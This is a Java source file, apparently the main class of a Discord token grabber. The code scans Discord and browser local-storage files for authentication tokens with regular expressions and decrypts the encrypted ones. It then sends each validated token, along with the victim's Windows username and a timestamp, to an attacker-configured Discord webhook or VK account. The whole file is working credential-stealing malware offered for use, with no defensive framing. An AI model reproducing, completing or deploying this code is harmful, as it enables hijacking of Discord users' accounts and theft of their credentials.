package com.github.dedinc.discordtokengrabber;

import com.github.dedinc.discordtokengrabber.utils.Helper;
import java.io.BufferedReader;
import java.io.FileReader;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Base64;
import java.util.Calendar;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class Main {
    public static final boolean VK_ENABLED = false; // If need send to VK
    public static final String WEBHOOK_URL = "DISCORD WEBHOOK URL";
    public static final String VK_TOKEN = "VK TOKEN"; // If VK enabled
    public static final int VK_RECEIVER_ID = 1337; // ID of user/group/chat to send log in VK
    private static final ArrayList<String> tokens = new ArrayList<>();

    public static void main(String[] args) {
        logCurrentTimeAndUser();
        searchTokens();
        if (tokens.isEmpty()) {
            Helper.getSender().sendMessage("Tokens not found!");
        }
        System.exit(0);
    }

    private static void logCurrentTimeAndUser() {
        String timestamp = new SimpleDateFormat("HH:mm:ss").format(Calendar.getInstance().getTime());
        String username = System.getenv("USERNAME");
        Helper.getSender().sendMessage(String.format("[%s] - Searching token on %s", timestamp, username));
    }

    private static void searchTokens() {
        Helper.getManager().getPaths().forEach(path -> {
            boolean isFirefox = path.contains("Firefox");
            getTokens(path, isFirefox);
        });
    }

    private static void getTokens(String path, boolean isFirefox) {
        try {
            Path storagePath = isFirefox ? Paths.get(path) : Paths.get(path, "Local Storage", "leveldb");
            Files.list(storagePath)
                    .limit(100)
                    .filter(file -> isValidFile(file.toFile().getName()))
                    .forEach(Main::processFile);
        } catch (Exception ignored) {
        }
    }

    private static boolean isValidFile(String fileName) {
        return fileName.endsWith(".log") || fileName.endsWith(".ldb") || fileName.endsWith(".sqlite");
    }

    private static void processFile(Path file) {
        try (BufferedReader reader = new BufferedReader(new FileReader(file.toFile()))) {
            String line;
            while ((line = reader.readLine()) != null) {
                processLine(line, file.toFile().getAbsolutePath().toLowerCase());
            }
        } catch (Exception ignored) {
        }
    }

    private static void processLine(String line, String filePath) {
        for (int i = 24; i < 30; i++) {
            parseToken(line, "[\\w-]{" + i + "}\\.[\\w-]{6}\\.[\\w-]{38}");
        }
        if (filePath.contains("roaming") && filePath.contains("discord")) {
            parseToken(line, "dQw4w9WgXcQ:[^.*\\['(.*)'\\].*$][^\\\"]*");
        }
    }

    private static void parseToken(String line, String regex) {
        Pattern pattern = Pattern.compile(regex);
        Matcher matcher = pattern.matcher(line);

        while (matcher.find()) {
            String token = matcher.group();
            if (token.startsWith("dQw4w9WgXcQ")) {
                try {
                    token = Helper.getChecker().decryptToken(token);
                } catch (Exception ignored) {
                }
            }
            addTokenIfNotExists(token);
        }
    }

    private static void addTokenIfNotExists(String token) {
        if (!tokens.contains(token)) {
            Long.parseLong(new String(Base64.getDecoder().decode(token.split("\\.")[0]), StandardCharsets.UTF_8));
            Helper.getSender().sendMessage(Helper.getChecker().checkUser(token));
            tokens.add(token);
        }
    }
}